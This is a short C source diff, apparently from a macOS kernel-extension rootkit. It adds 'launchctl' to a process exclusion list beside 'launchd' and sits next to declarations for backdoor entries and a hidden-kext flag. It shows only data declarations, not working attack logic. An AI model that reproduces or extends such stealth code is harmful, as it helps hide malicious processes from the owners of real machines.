@@ -55,11 +55,12 @@
 #pragma mark -
 
 static reg_backdoors_t *g_reg_backdoors[MAX_BACKDOOR_ENTRIES];
-static exclusion_list_t g_exclusion_list[1] = {
+static exclusion_list_t g_exclusion_list[2] = {
   "launchd", 1,
+  "launchctl", 1,
 };
 
-static int g_process_excluded = 1;
+static int g_process_excluded = 2;
 static int g_kext_hidden      = 0;
 
 // Holding current kmod entry pointer
